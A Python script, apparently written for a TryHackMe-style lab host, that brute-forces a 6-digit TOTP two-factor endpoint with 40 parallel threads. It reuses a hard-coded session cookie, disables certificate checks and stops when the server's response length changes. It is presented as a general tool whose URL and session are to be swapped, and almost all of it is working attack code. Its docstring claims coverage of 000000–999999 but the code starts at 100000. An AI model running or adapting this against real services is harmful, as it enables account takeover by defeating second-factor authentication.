"""
Purpose:
--------
This script performs a high-speed, multi-threaded brute-force attack against a
6-digit Time-Based One-Time Password (TOTP) verification endpoint.

It iterates through all possible 6-digit OTP values (000000–999999) using
concurrent HTTP requests while maintaining a valid authenticated session.
The script monitors server responses to detect successful authentication,
session invalidation, or error conditions, and terminates early upon success.

Key Features:
-------------
- Multi-threaded execution for maximum throughput
- Reusable HTTP session for reduced latency
- Progress tracking with real-time ETA
- Early termination on OTP discovery or session loss

Usage:
------
For authorized and educational purposes only.
Change URL, SESSION, HEADERS, and THREADS variables for your needs.

By: xGh05t
"""

import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import threading

urllib3.disable_warnings()

URL = "https://breachblocker.thm:8443/api/verify-2fa"

SESSION = ".eJxtjuELwUAYh_-X96uF-EArhdqEpJTYpPXu7t12ud1yd0OT_91IFD4_z-_pd4UY1SHqJBixghO4oNp-b-qJrWRlo7Hqt7MqlWnYPcaz0LtsjM_H3qKzClvKTtbHUbWcB8EAnE_mRFokgji4CUpDL4JSFmfiES9yFMqAuwNCY0nHpVKCTNNmOey_ZKpd-XQZal3YGtLwd-ZAjjJD_Y-9k6XNSFnB0D6uWV3S7Q6IjVrY.aYGTeg.Cikeq08TTwLp9CzA1WUK7wAJjl4"

HEADERS = {
    "Content-Type": "application/json",
    "Cookie": f"session={SESSION}",
    "Connection": "keep-alive"
}

START = 100000
END = 1000000
THREADS = 40   # Threads can be adjusted (20–60 is usually the sweet spot)

stop_event = threading.Event()


def check_otp(session, otp):
    if stop_event.is_set():
        return None

    try:
        r = session.post(
            URL,
            headers=HEADERS,
            json={"code": otp},
            verify=False,
            allow_redirects=False,
            timeout=3
        )
    except requests.exceptions.RequestException:
        return None

    if "No 2FA code generated" in r.text:
        stop_event.set()
        return ("SESSION_LOST", otp, r.text)

    # Your detection logic
    if len(r.text) != 25:
        stop_event.set()
        return ("FOUND", otp, r.text)

    return None


def main():
    otps = (f"{i:06d}" for i in range(START, END))
    total = END - START

    with requests.Session() as session:
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = [executor.submit(check_otp, session, otp) for otp in otps]

            for future in tqdm(as_completed(futures), total=total, desc="Bruteforcing OTP", unit="otp"):
                result = future.result()

                if result:
                    status, otp, response = result

                    if status == "FOUND":
                        tqdm.write(f"\n[+] OTP FOUND: {otp}")
                        tqdm.write(f"Response: {response}")
                    elif status == "SESSION_LOST":
                        tqdm.write("\n[!] SESSION LOST – OTP DELETED")
                        tqdm.write(f"Response: {response}")

                    stop_event.set()
                    break


if __name__ == "__main__":
    main()

